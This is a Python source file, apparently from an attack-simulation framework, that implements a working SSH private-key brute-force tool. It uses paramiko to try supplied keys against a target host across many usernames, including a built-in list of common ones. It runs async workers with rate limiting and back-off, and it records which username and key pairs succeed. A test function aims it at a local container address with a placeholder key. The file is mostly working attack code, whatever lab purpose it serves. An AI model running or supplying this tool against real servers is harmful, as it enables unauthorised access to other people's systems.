#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun May 24 05:52:31 2026

@author: hounsousamuel
"""

import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import io
import time
import socket
import asyncio
import paramiko
import concurrent.futures
from typing import Dict, List
from tactics.initial_access.data.ssh_brute_force.passwords import COMMON_USERNAMES
from simulateur_utils.logger import get_logger

logger = get_logger()


class AlgoInvalidError(Exception):
    def __init__(self, *args):
        self.tb = None


class SSHKeyBruteForce:
    def __init__(
        self,
        timeout: int = 2,
        delay: float = 0.5,
        max_attempts: int = 50,
        total_timeout: float | None = None,
    ):
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=4,
            thread_name_prefix="ssh_key_brute_force"
        )
        self.start_time = time.time()
        self.timeout = timeout
        self.delay = delay
        self.max_attempts = max_attempts
        self.results = []
        self.founds = []
        self.attempts = 0
        self.total_timeout = total_timeout
        self.stop_event = asyncio.Event()
        self.sleep_event = asyncio.Event()
        self.lock = asyncio.Lock()
        self.sleep_delay = 10

    def log(self, message: str, log: bool = True):
        """Méthode de log interne."""
        if log:
            logger.print(message)

    @classmethod
    def map_algo(cls, algo: str = "Ed25519"):
        algo = algo.lower()
        if algo in ("ed25519", "openssh"):
            return paramiko.Ed25519Key
        
        elif algo == "rsa":
            return paramiko.RSAKey
        
        # elif algo == "dsa":
        #     return paramiko.DSSKey
        
        elif algo == "ecdsa":
            return paramiko.ECDSAKey
        
        return paramiko.Ed25519Key

    def get_list_algo(self):
        return [
            "Ed25519",
            "RSA",
            "ECDSA",
            # "DSA"
        ]

    def _algo_is_valid(self, algo: str):
        valid = self.get_list_algo()
        valid.extend([al.lower() for al in valid])
        return algo in valid
    
    def _verify_key_validity(self, key_content:str):
        for cls in (
            paramiko.RSAKey, paramiko.ECDSAKey, 
            paramiko.Ed25519Key, #paramiko.DSSKey,
        ):
            try:
                cls.from_private_key(io.StringIO(key_content))
                return True
            except paramiko.SSHException as e:
                self.log(f'La clé {key_content[:80]} est invalide pour {cls}.\nErreur: {str(e)}', log=True)
            
            except Exception:
                pass
            
        return False
    
    def get_key(self, key_or_filename: str, algo: str, is_file: bool = False, **kwargs):
        # print(algo)
        # print(key_or_filename)
        # print(self._verify_key_validity(key_or_filename))
        # input()
        if not self._algo_is_valid(algo):
            raise AlgoInvalidError()

        if is_file:
            if not os.path.exists(key_or_filename):
                raise FileNotFoundError()
            else:
                key_or_filename = open(key_or_filename).read()

        if not key_or_filename:
            return None
        
        if not self._verify_key_validity(key_or_filename):
            return None
        
        pkey = self.map_algo(algo).from_private_key(io.StringIO(key_or_filename))
        return pkey

    def _try_connect(
        self,
        ip: str,
        port: int,
        username: str,
        key
    ) -> bool:
        """
        Méthode qui vérifie si les crédentials sont corrects.

        Parameters
        ----------
        ip : str
            L'IP.
        port : int
            Le port.
        username : str
            L'username ssh.
        key : paramiko key
            La clé ssh.

        Returns
        -------
        bool
            True/False selon succès/echec.

        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=ip,
                port=port,
                username=username,
                pkey=key,
                timeout=self.timeout
            )
            self.log(f"✅ SUCCESS: {username}:{type(key).__name__}", log=True)
            return True

        except paramiko.AuthenticationException:
            self.log(f"❌ FAIL: {username}:{type(key).__name__}", log=True)
            return False

        except socket.timeout:
            return False

        except paramiko.SSHException:
            return False

        except (paramiko.ssh_exception.NoValidConnectionsError, ConnectionRefusedError):
            self.stop_event.set()
            return False

        except ConnectionResetError:
            self.sleep_event.set()
            return False

        except Exception as e:
            self.log(f"⚠️ ERROR: {e}", log=True)
            return False

        finally:
            client.close()

    async def _find_all_helpers(
        self,
        ip: str,
        port: int,
        username: str,
        key: str,
        loop: asyncio.AbstractEventLoop
    ):
        try:
            return await loop.run_in_executor(
                self.thread_pool,
                self._try_connect,
                ip, port, username, key
            )
        except asyncio.CancelledError:
            self.stop_event.set()
            return False

    async def find_all_workers(
        self,
        ip: str,
        port: int,
        usernames: List[str],
        key: Dict,
        lock: asyncio.Lock,
    ) -> list[dict]:

        loop = asyncio.get_running_loop()
        trys = 0
        results = []
        founds = []
        try:
            for username in usernames:
                success = await self._find_all_helpers(ip, port, username, key["key"], loop)
                trys += 1
                async with lock:
                    self.attempts += 1
    
                if self.stop_event.is_set():
                    break
    
                if self.sleep_event.is_set():
                    await asyncio.sleep(self.sleep_delay)
                    self.sleep_event.clear()
    
                results.append({
                    'username': username,
                    "key_type": type(key).__name__,
                    "success": success,
                    **key,
                })
    
                if success:
                    founds.append({
                        'username': username,
                        "key_type": type(key).__name__,
                        **key,
                    })
                    break
    
                if trys % 5 == 0 and trys != 0:
                    trys = 0
                    async with lock:
                        self.results.extend(results)
                        self.founds.extend(founds)
                        founds, results = [], []
    
                await asyncio.sleep(self.delay)
    
            async with lock:
                self.results.extend(results)
                self.founds.extend(founds)
        
        except asyncio.CancelledError:
            pass

    async def monitor(self):
        while True:
            await asyncio.sleep(2)
            if self.stop_event.is_set() or self.attempts > self.max_attempts:
                return True

    async def find_all_async(
        self, ip: str,
        port: int = 22,
        usernames: List | None = None,
        keys: List[Dict[str, str | bool]] = [],
        add_common: bool = False
    ):

        if add_common:
            usernames = list(set(usernames or [])) + list(set(COMMON_USERNAMES))

        else:
            usernames = usernames or COMMON_USERNAMES

        self.log(f"Début SSH KEY BRUTE FORCE à : {time.ctime()}, pour ip : {ip} et port {port} ", log=True)
        self.log(f"PORT : {port}")
        self.log(f"Users: {len(usernames)}, Keys: {len(keys)}", log=True)
        self.start_time = time.time()
        loaded_keys = []
        for key in keys:
            try:
                backup = key
                key = self.get_key(**key)
                if key:  # Ne charger que si la clé est valide
                    loaded_keys.append({"key": key, "raw_key": backup["key_or_filename"]})
                else:
                    self.log("⚠️ Clé ignorée: clé vide ou invalide", log=True)
            except AlgoInvalidError:
                self.log("⚠️ Algorithme invalide pour la clé", log=True)
            except Exception as e:
                self.log(f"⚠️ Erreur chargement clé: {e}", log=True)
                import traceback
                traceback.print_exc()

        if not loaded_keys:
            self.log("❌ Aucune clé valide à tester", log=True)
            return self.get_result([item["raw_key"] for item in loaded_keys])

        tasks = [
            asyncio.create_task(
                self.find_all_workers(ip, port, usernames, key, self.lock)
            )
            for key in loaded_keys
        ]
        gather_tasks = asyncio.gather(*tasks)
        monitor_task = asyncio.create_task(self.monitor())
        done, pending = await asyncio.wait(
            [gather_tasks, monitor_task],
            timeout=self.total_timeout,
            return_when=asyncio.FIRST_COMPLETED
        )
        try:
            for task in done:
                task.result()
        except Exception as e:
            logger.print("Erreur :", str(e))

        finally:
            try:
                for task in tasks:
                    task.cancel()

                monitor_task.cancel()
                await asyncio.gather(*pending, return_exceptions=True)
            except Exception:
                pass

        self.end_time = time.time()
        self.log(f"Fin SSH KEY BRUTE FORCE : {len(self.results)} tentatives", log=True)
        self.log(f"Credentials trouvés: {len(self.founds)}", log=True)
        return self.get_result([item["raw_key"] for item in loaded_keys])

    def find_all_sync(self, *args, **kwargs):
        return asyncio.run(self.find_all_async(*args, **kwargs))

    def get_result(self, keys: List[str]):
        final_result = {
            key: list(
                filter(
                    lambda x: x["key"] == key,
                    self.results
                ) or []
            )
            for key in keys
        }
        founds = {
            key: list(
                filter(
                    lambda x: x["key"] == key,
                    self.founds
                ) or []
            )
            for key in keys
        }
        return {
            "founds": founds,
            "results": final_result
        }


# =============================================================================
# FONCTION DE TEST
# =============================================================================

def test_ssh_key_bruteforce(
    ip: str = "172.17.0.2",
    port: int = 22,
    usernames: List[str] = None,
):
    """
    Teste la classe SSHKeyBruteForce sur une cible.

    Args:
        ip (str): IP de la cible.
        port (int): Port SSH.
        usernames (List[str]): Liste des usernames à tester.
    """
    print(f"\n🔐 Test SSH Key Bruteforce sur {ip}:{port}")
    print("-" * 50)

    # Exemple de clé de test (à remplacer par une vraie clé)
    test_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----"""

    bf = SSHKeyBruteForce(timeout=5, delay=0.2, max_attempts=20)

    result = bf.find_all_sync(
        ip=ip,
        port=port,
        usernames=usernames or ["root", "testuser", "admin"],
        keys=[
            {"key_or_filename": test_key, "algo": "RSA", "is_file": False},
        ],
        add_common=True
    )

    print("\n📊 Résultat:")
    print(f"   founds: {result.get('founds', {})}")
    print(f"   total_results: {len(result.get('results', {}))}")

    return result


if __name__ == "__main__":
    test_ssh_key_bruteforce()